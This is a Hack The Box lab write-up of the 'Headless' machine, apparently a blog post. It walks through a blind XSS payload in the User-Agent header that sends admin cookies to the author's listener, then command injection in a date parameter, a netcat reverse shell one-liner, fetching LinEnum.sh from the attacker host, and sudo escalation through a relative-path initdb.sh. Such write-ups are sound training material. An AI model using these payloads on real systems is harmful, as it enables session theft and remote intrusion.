@@ -1,0 +1,311 @@
+---
+title: Headless Writeup - Hack The Box
+description: Exploiting XSS and command injection vulnerabilities for initial access, then abusing sudo privileges for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-09
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ nmap -sVC 10.129.70.156
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-08 22:49 EEST
+Nmap scan report for 10.129.70.156
+Host is up (0.054s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 900294283dab2274df0ea3b20f2bc617 (ECDSA)
+|_  256 2eb90824021b609460b384a99e1a60ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Wed, 08 Oct 2025 20:01:29 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="UTF-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <title>Under Construction</title>
+|     <style>
+<SNIP>
+|   RTSPRequest:
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request version ('RTSP/1.0').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.93%I=7%D=10/8%Time=68E6C304%P=aarch64-unknown-linux-gn
+SF:u%r(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\
+SF:.2\x20Python/3\.11\.2\r\nDate:\x20Wed,\x2008\x20Oct\x202025\x2020:01:29
+<SNIP>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 790.04 seconds
+```
+The web server is running on port `5000`.
+
+Visting port `5000` we see the following: ![Web application homepage](/images/blog/headless/20251008225116.png)
+
+Clicking "For questions" shows the following form: ![Contact form](/images/blog/headless/20251008225225.png)
+
+Submitting the form makes the following POST request: ![Form submission request](/images/blog/headless/20251008225412.png)
+it doesn't show the submitted form back to us.
+### XSS
+Since we're sending messages to staff members, we can try checking if the form is vulnerable to XSS.
+
+We can start with a basic payload like `<script>alert(window.origin)</script>`: ![XSS payload attempt](/images/blog/headless/20251008225924.png)
+
+However, it displays the following "hacking attempt" message: ![Hacking attempt detected](/images/blog/headless/20251008230002.png)
+
+While the form's contents aren't displayed back to us, the headers are. We can intercept the request and modify the `User-Agent` header: ![User-Agent XSS payload](/images/blog/headless/20251008231500.png)
+
+<Callout title="Header Vulnerability" type="info">
+Other headers are also vulnerable, not just `User-Agent`.
+</Callout>
+
+The alert is shown back to us, confirming the XSS vulnerability: ![XSS alert confirmation](/images/blog/headless/20251008231415.png)
+
+We can attempts a Blind XSS attack to steal cookies (session hijacking), since these reports are viewed by admins.
+
+To do that, first we start a python web server:
+```console title="Python web server"
+nontas@local$ python3 -m http.server 1234
+```
+
+Then, we change our payload to the following:
+```html
+<script>new Image().src='http://10.10.14.78:1234/?cookie='+document.cookie</script>
+```
+
+We do get a response back after a while:
+```console title="Cookie stealing"
+nontas@local$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.129.70.156 - - [08/Oct/2025 23:32:48] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
+```
+So we successfully got the cookie `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`.
+
+### Admin Dashboard
+Let's fuzz for other pages:
+```console title="Directory fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.70.156:5000/FUZZ -ic
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.70.156:5000/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 2799, Words: 963, Lines: 96, Duration: 77ms]
+support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 69ms]
+dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 83ms]
+```
+
+`/dashboard` with the admin cookie set shows the following: ![Admin dashboard](/images/blog/headless/20251009000729.png)
+
+Clicking the button makes the following request: ![Dashboard request](/images/blog/headless/20251009000806.png)
+and shows "Systems are up and running!" on the green bar.
+
+## Initial Foothold - Command Injection
+We attempt command injection by changing the request body to:
+```
+date=2023-09-15;id
+```
+and we do see the output of `id` on the webpage:
+```
+Systems are up and running!
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+```
+
+For a reverse shell, first run the `nc` listener:
+```console
+nontas@local$ nc -lnvp 1234
+```
+
+Via trial and error, we find that the following reverse shell works:
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 1234 >/tmp/f
+```
+(Don't forget to URL encode it)
+
+And we get a reverse shell connection:
+```console title="Reverse shell"
+nontas@local$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.70.156.
+Ncat: Connection from 10.129.70.156:33874.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+```
+
+Upgrade the shell:
+```console title="Shell upgrade"
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+dvir@headless:~/app$ ^Z
+[1]  + 29493 suspended  nc -lnvp 1234
+nontas@local$ stty raw -echo;fg
+[1]  + 29493 continued  nc -lnvp 1234
+
+dvir@headless:~/app$
+```
+
+And get the user flag:
+```console
+dvir@headless:~/app$ id
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+dvir@headless:~/app$ cat /home/dvir/user.txt
+```
+
+## Privilege Escalation
+Start a python web server locally with the file `LinEnum.sh` downloaded:
+```console
+nontas@local$ python3 -m http.server 8082
+```
+
+Download it on the remote and execute it:
+```console title="LinEnum execution"
+dvir@headless:~/app$ wget http://10.10.14.78:8082/LinEnum.sh
+dvir@headless:~/app$ chmod +x LinEnum.sh
+dvir@headless:~/app$ ./LinEnum.sh
+```
+
+We see the following interesting info:
+```txt
+[+] We can sudo without supplying a password!
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+    
+<SNIP>
+
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x  2 root mail 4096 Sep 10  2023 .
+drwxr-xr-x 11 root root 4096 Sep  9  2023 ..
+-rw-r--r--  1 root mail  772 Sep 10  2023 dvir
+```
+
+The mail says the following:
+```console title="Mail content"
+dvir@headless:~$ cat /var/mail/dvir
+Subject: Important Update: New System Check Script
+
+Hello!
+
+We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.
+
+What's special for you?
+- You've been granted special privileges to use this script.
+- It will help identify and resolve system issues more efficiently.
+- It ensures that necessary updates are applied when needed.
+
+Rest assured, this script is at your disposal and won't affect your regular use of the system.
+
+If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.
+
+By the way, we're still waiting on you to create the database initialization script!
+Best regards,
+Headless
+```
+
+We've already found the script's location at `/usr/bin/syscheck` (we can also find it via `sudo -l`).
+
+The script has the following contents:
+```bash
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
+
+First, it checks if we're running it with root privileges, and exits if not:
+```bash
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+```
+
+Then it prints some statistics, and also starts the DB service if it's not running.
+
+We can exploit it by creating a **custom `initdb.sh` script** with our malicious code, that will grant us a root shell.
+
+Create the script in the `/tmp` folder:
+```console title="Malicious script creation"
+dvir@headless:~$ cd /tmp
+dvir@headless:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > initdb.sh
+dvir@headless:/tmp$ chmod +x initdb.sh
+```
+
+And execute `/usr/bin/syscheck` (upgrade the shell afterwards):
+```console title="Root escalation"
+dvir@headless:/tmp$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.9G
+System load average:  0.00, 0.04, 0.00
+Database service is not running. Starting it...
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@headless:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@headless:/tmp# cat /root/root.txt
+```
+
+We have successfully completed **Headless**!
